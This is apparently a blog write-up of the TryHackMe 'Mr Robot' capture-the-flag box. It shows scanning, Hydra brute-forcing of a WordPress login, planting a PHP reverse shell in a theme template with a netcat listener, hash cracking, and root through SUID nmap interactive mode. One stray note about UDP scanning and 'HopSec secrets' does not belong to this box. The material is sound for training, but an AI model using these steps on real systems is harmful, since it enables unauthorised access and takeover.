---
author: Manas S
pubDatetime: 2026-1-08T15:22:00Z
modDatetime: 2026-1-08T16:52:45.934Z
title: Mr Robot CTF Writeup
slug: mr-robot
featured: true
draft: false
tags:
    - writeup
    - pwn
description: Write up for the Mr Robot CTF box on tryhackme
ogImage: ../../../assets/images/blogs/robot.webp
---

Mr Robot is an awesome series which talks directly to the hearts of cyber security enthusiast or anyone who loves messing around with computers. That said, this lab was very fun and i learnt some great new techniques.

## Table of contents

## 1. Initial Reconnaissance & Scanning

NOTE: there are also 65535 ports for UDP, another transport protocol. And there is a chance HopSec secrets are hiding there, too! You can switch to UDP scan by specifying the `-sU` flag:
### Nmap Scan
Perform a service version and script scan to identify open ports.
```
nmap -sV -sC -oA scans/initial <TARGET_IP>
```
- **-sV**: Probe open ports to determine service/version info.
- **-sC**: Equivalent to `--script=default` (runs common scripts).
- **-oA**: Output in all formats (normal, grepable, XML).
**Results:**
- **Port 80**: HTTP (Apache) - Open
- **Port 443**: HTTPS - Open
- **Port 22**: Closed (The scan might report it as closed/filtered, which is unusual).

### Web Enumeration (Port 80)
1. **Manual Inspection**:
    - The site is an interactive Mr. Robot themed terminal.
    - **Easter Egg**: Viewing the page source (`Ctrl+U`) reveals a comment: _"if you are not alone"_.
    - **Key Discovery**: The `robots.txt` file is often used to hide files from crawlers.
        - Navigate to: `http://<TARGET_IP>/robots.txt`
        - **Found:** `fsocity.dic` (A dictionary wordlist).
        - **Found:** `key-one-of-three.txt` (The first flag).
2. **Download Wordlist**:
    - Download the dictionary file found in `robots.txt` for later use.
    - _Note:_ The filename is likely `fsocity.dic` (misspelled "fsociety").
    ```
    wget http://<TARGET_IP>/fsocity.dic
    ```

### Directory Brute Forcing (Gobuster)
Search for hidden directories and pages.
```
gobuster dir -u http://<TARGET_IP> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -t 100 -q -o scans/gobuster.txt
```
**Results:**
- `/wp-login` (Status: 200) -> Indicates a **WordPress** installation.
- `/license`
- `/readme`

## 2. Gaining Access (WordPress)
### Capturing the Request
1. Open **Burp Suite** and enable FoxyProxy.
2. Navigate to `http://<TARGET_IP>/wp-login`.
3. Attempt a login with dummy credentials (e.g., `admin` / `admin`).
4. Intercept the **POST** request to identify parameters: `log` (username), `pwd` (password), and `wp-submit`.
### Username Enumeration (Hydra)
The WordPress site returns verbose errors like _"Invalid username"_. We can abuse this to brute-force a valid user from the `fsocity.dic` list.
```
hydra -L fsocity.dic -p test <TARGET_IP> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username"
```
- **-L**: List of usernames to try (using the downloaded dictionary).
- **-p**: A static password (dummy).
- **Error String**: `Invalid username` (Hydra looks for this to know the attempt failed).
**Result**: Valid Username found -> **Elliot**

### Password Brute Force (Hydra)
Now that we have the username `Elliot`, we brute-force his password using the same list. The error message changes when the username is correct but the password is wrong.
```
hydra -l Elliot -P fsocity.dic <TARGET_IP> http-post-form \
  "/wp-login.php:log=Elliot&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username Elliot is incorrect"
```
- **-l**: Static username (`Elliot`).
- **-P**: Password list (`fsocity.dic`).
- **Error String**: `The password you entered for the username Elliot is incorrect`.
**Result**: Password found -> **ER28-0652**

## 3. Initial Shell (Daemon)
1. **Login**: Access the dashboard at `/wp-admin` using credentials `Elliot` : `ER28-0652`.
2. **Prepare Payload**:
    - Download the [PHP Reverse Shell from Pentest Monkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell "null").
    - Open `Appearance` > `Editor` in WordPress.
    - Select a template to edit, such as **Archive (archive.php)** or **404 Template (404.php)**.
    - Paste the PHP shell code into the editor.
    - **Crucial**: Update `$ip` to your attack machine IP (Tun0) and `$port` (e.g., 53).
3. Start Listener:
    Use port 53 (DNS) as it is often allowed through firewalls.
    ```
    rlwrap nc -lvnp 53
    ```
4. Execute:
    Navigate to the modified file in the browser:
    http://<TARGET_IP>/wp-content/themes/2015/archive.php
**Status**: You should now have a shell as user `daemon`.

## 4. Privilege Escalation (Daemon -> Robot)
### Enumeration
Check the home directory for users.
```
ls -la /home/robot
```
- **Found**: `key-2-of-3.txt` (Not readable by daemon).
- **Found**: `password.raw-md5` (Readable).

### Cracking the Hash
1. Read the password hash:
    ```
    cat /home/robot/password.raw-md5
    ```
2. Copy the hash to your attacking machine.
3. Crack it using **John the Ripper**:
    ```
    john hash.txt --wordlist=fsocity.dic --format=raw-md5
    ```
    - _Note_: If `fsocity.dic` has duplicates, John might complain. The list is small enough that it works quickly.
**Result**: Password found -> **abcdefghijklmnopqrstuvwxyz**

### Switching Users
1. **Stabilize Shell**: `su` requires an interactive terminal.
    ```
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
2. **Switch User**:
    ```
    su robot
    # Enter password: abcdefghijklmnopqrstuvwxyz
    ```
3. **Flag 2**: Now you can read `key-2-of-3.txt`.

## 5. Privilege Escalation (Robot -> Root)
### SUID Enumeration
Look for binaries with the SUID bit set, which allows them to run with the permissions of the file owner (root).
```
find / -perm -u=s -type f 2>/dev/null
```
**Result**: `/usr/local/bin/nmap` is listed.

### Exploiting Nmap SUID
Older versions of Nmap (2.02 to 5.21) allow interactive mode, which can be used to spawn a shell. Since the binary has SUID root, the spawned shell will be root.
1. **Check GTFOBins**: [GTFOBins Nmap](https://gtfobins.github.io/gtfobins/nmap/ "null")
2. **Exploit**:
    ```
    nmap --interactive
    nmap> !sh
    ```
3. **Verify**:
    ```
    whoami
    # Output: root
    ```
4. **Flag 3**: Navigate to `/root` to find the final key.

## Important Resources & Links
- **PHP Reverse Shell**: [Pentest Monkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell "null")
- **GTFOBins**: [https://gtfobins.github.io/](https://gtfobins.github.io/ "null") - Essential for checking SUID/Sudo bypass binaries.
- **Burp Suite**: [PortSwigger](https://portswigger.net/burp "null")
- **FoxyProxy**: [Firefox Add-on](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ "null")
- **Wordlists**: Usually found in `/usr/share/wordlists/` (e.g., `rockyou.txt` or `dirbuster` lists).